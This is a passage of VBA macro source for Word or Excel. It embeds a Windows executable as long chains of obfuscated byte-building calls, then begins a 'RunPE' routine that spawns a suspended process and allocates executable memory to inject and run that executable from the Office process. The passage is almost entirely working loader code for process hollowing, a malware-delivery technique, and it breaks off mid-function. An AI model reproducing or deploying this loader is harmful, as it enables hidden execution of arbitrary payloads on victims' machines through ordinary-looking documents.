    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE29 = strPE
End Function

Private Function PE30() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "NB10"), 0), 0), 0), 0), "6"), 128), 193), "J"), 1), 0), 0), 0), "C:\loc")
    strPE = B(strPE, "al0\asf\release\build-2.2.14\support\Release\ab.pd")
    strPE = A(B(strPE, "b"), 0)

    PE30 = strPE
End Function

Private Function PE() As String
    Dim strPE As String
    strPE = ""
    strPE = strPE + PE0()
    strPE = strPE + PE1()
    strPE = strPE + PE2()
    strPE = strPE + PE3()
    strPE = strPE + PE4()
    strPE = strPE + PE5()
    strPE = strPE + PE6()
    strPE = strPE + PE7()
    strPE = strPE + PE8()
    strPE = strPE + PE9()
    strPE = strPE + PE10()
    strPE = strPE + PE11()
    strPE = strPE + PE12()
    strPE = strPE + PE13()
    strPE = strPE + PE14()
    strPE = strPE + PE15()
    strPE = strPE + PE16()
    strPE = strPE + PE17()
    strPE = strPE + PE18()
    strPE = strPE + PE19()
    strPE = strPE + PE20()
    strPE = strPE + PE21()
    strPE = strPE + PE22()
    strPE = strPE + PE23()
    strPE = strPE + PE24()
    strPE = strPE + PE25()
    strPE = strPE + PE26()
    strPE = strPE + PE27()
    strPE = strPE + PE28()
    strPE = strPE + PE29()
    strPE = strPE + PE30()
    PE = strPE
End Function
' ===== END PE2VBA =====


' ================================================================================
'                                   ~~~ MAIN ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    RunPE
' Desc:      Main method. Executes a PE from the memory of Word/Excel
' Arguments: baImage - A Byte array representing a PE file
'            strArguments - A String representing the command line arguments
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)

    Debug.Print ("[*] Checking source PE...")
    ' Populate IMAGE_DOS_HEADER structure
    ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
    Dim structDOSHeader As IMAGE_DOS_HEADER
    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
    
    
    ' Check Magic Number (i.e. is it a PE file?)
    ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ Magic number is OK.")
        End If
    Else
        Debug.Print ("    |__ Input file is not a valid PE.")
        Exit Sub
    End If
    
    
    ' Populate IMAGE_NT_HEADERS structure
    ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
    ' |__ IMAGE_NT_HEADERS size is 248 (0xf8) (32 bits)
    ' |__ IMAGE_NT_HEADERS size is 264 (0x108) (64 bits)
    Dim structNTHeaders As IMAGE_NT_HEADERS
    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
    
    
    ' Check NT headers Signature
    ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ NT Header Signature is OK.")
        End If
    Else
        Debug.Print ("    |__ NT Header Signature is not valid.")
        Exit Sub
    End If
    
    
    ' Check CPU architecture
    If VERBOSE Then
        Debug.Print ("    |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
    End If
    #If Win64 Then
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
            Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
            Exit Sub
        End If
    #Else
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
            Debug.Print ("[-] You're trying to inject a 64 bits binary into a 32 bits process!")
            Exit Sub
        End If
    #End If
    
    
    ' Get the path of the current process executable
    Dim strCurrentFilePath As String
    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
    Dim lGetModuleFileName As Long
    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
    
    
    ' Format command line
    Dim strCmdLine As String
    strCmdLine = strCurrentFilePath + " " + strArguments
    
    
    ' Create new process in suspended state
    Debug.Print ("[*] Creating new process in suspended state...")
    Dim strNull As String
    Dim structProcessInformation As PROCESS_INFORMATION
    Dim structStartupInfo As STARTUPINFO
    If VERBOSE Then
        Debug.Print ("    |__ Target PE: '" + strCurrentFilePath + "'")
    End If
    Dim lCreateProcess As Long
    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
    If lCreateProcess = 0 Then
        Debug.Print ("    |__ CreateProcess() failed (Err: " + Str(Err.LastDllError) + ").")
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ CreateProcess() OK")
        End If
    End If
    
    
    ' Get Thread Context
    Debug.Print ("[*] Retrieving the context of the main thread...")
    Dim structContext As CONTEXT
    structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
    Dim lGetThreadContext As Long
    #If Win64 Then
        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lGetThreadContext = 0 Then
        Debug.Print ("    |__ GetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        #If Win64 Then
            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
        #End If
        If VERBOSE Then
            Debug.Print ("    |__ GetThreadContext() OK")
        End If
    End If
    
    
    ' Get image base of the target process (if we want to unmap it before injecting our PE)
    ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
    ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
    'Debug.Print ("[*] Reading target process base image address...")
    'Dim ptrTargetImageBase As LongPtr
    'Dim ptrTargetImageBaseLocation As LongPtr
    '#If Win64 Then
    '    ptrTargetImageBaseLocation = structContext.Rdx + 16
    '#Else
    '    ptrTargetImageBaseLocation = structContext.Ebx + 8
    '#End If
    
    'Dim lReadProcessMemory As Long
    'lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, ptrTargetImageBaseLocation, VarPtr(ptrTargetImageBase), SIZEOF_ADDRESS, 0)
    'If lReadProcessMemory = 0 Then
    '    Debug.Print ("    |__ ReadProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
    '    Call TerminateProcess(structProcessInformation.hProcess, 0)
    '    Exit Sub
    'Else
    '    If VERBOSE Then
    '        Debug.Print ("    |__ Target process image base address: Ox" + Hex(ptrTargetImageBase))
    '    End If
    'End If
    
    
    ' Unmap target image (optional)
    ' We don't really need to unmap the current image
    
    
    ' Get Relocation directory and check if the PE has a relocation table
    ' |__ NTHeaders.OptionalHeader.DataDirectory[5]
    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
    
    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
    If structRelocDirectory.VirtualAddress = 0 Then
        Debug.Print ("[!] PE has no relocation table, using default base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
    End If
    

    ' Allocate memory for the source image in the new process
    Debug.Print ("[*] Allocating memory for the source image in process with PID" + Str(structProcessInformation.dwProcessId) + "...")
    If VERBOSE Then
        Debug.Print ("    |__ PE image size: " + Str(structNTHeaders.OptionalHeader.SizeOfImage))
    End If
    Dim ptrProcessImageBase As LongPtr
    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrProcessImageBase = 0 Then
        Debug.Print ("    |__ VirtualAllocEx() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
